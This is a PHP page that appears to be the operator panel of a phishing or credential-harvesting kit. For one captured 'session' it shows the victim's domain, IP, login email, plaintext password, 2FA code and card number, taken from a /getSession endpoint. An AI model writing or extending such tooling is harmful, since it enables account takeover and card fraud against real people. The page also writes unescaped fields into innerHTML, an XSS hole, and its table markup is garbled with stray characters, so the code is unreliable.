<?php
// c3_session_detail.php - Session Details Page (NO session_start here)
require_once __DIR__ . '/assets/auth/auth.php';

$auth = new Auth();
$auth->requireLogin();

$socketId = $_GET['socketId'] ?? '';
if (!$socketId) {
    header('Location: c3_dashboard.php');
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Session Details</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</head>
<body class="bg-light">
    <div class="container mt-4">
        <div class="card">
            <div class="card-header bg-primary text-white">
                <h5>Session Details: <?php echo htmlspecialchars($socketId); ?></h5>
            </div>
            <div class="card-body" id="details"></div>
        </div>
    </div>
    <script>
    fetch(`/getSession?socketId=<?php echo urlencode($socketId); ?>`)
        .then(r => r.json())
        .then(data => {
            if (data.success && data.data) {
                const s = data.data;
                let html = `<table class="table">汽<th>Field</th><th>Value</th>换
                    <tr><td>Socket ID</td><td><code>${s.socketId}</code></td></tr>
                    <tr><td>Domain</td><td>${s.domain || 'unknown'}</td></tr>
                    <tr><td>IP</td><td>${s.clientIp || 'unknown'}</td></tr>
                    <tr><td>Created</td><td>${new Date(s.created_at).toLocaleString()}</td></tr>
                    <tr><td>Last Seen</td><td>${new Date(s.last_seen).toLocaleString()}</td></tr>
                    ${s.profile_name ? `<tr><td>Name</td><td>${s.profile_name}</td></tr>` : ''}
                    ${s.profile_email ? `<tr><td>Email</td><td>${s.profile_email}</td></tr>` : ''}
                    ${s.login_email ? `<tr><td>Login Email</td><td>${s.login_email}</td></tr>` : ''}
                    ${s.login_password ? `<tr><td>Password</td><td>${s.login_password}</td></tr>` : ''}
                    ${s['2fa_code'] ? `<tr><td>2FA Code</td><td>${s['2fa_code']}</td></tr>` : ''}
                    ${s.card_number ? `<tr><td>Card Number</td><td>${s.card_number}</td></tr>` : ''}
                </table>`;
                document.getElementById('details').innerHTML = html;
            }
        });
    </script>
</body>
</html>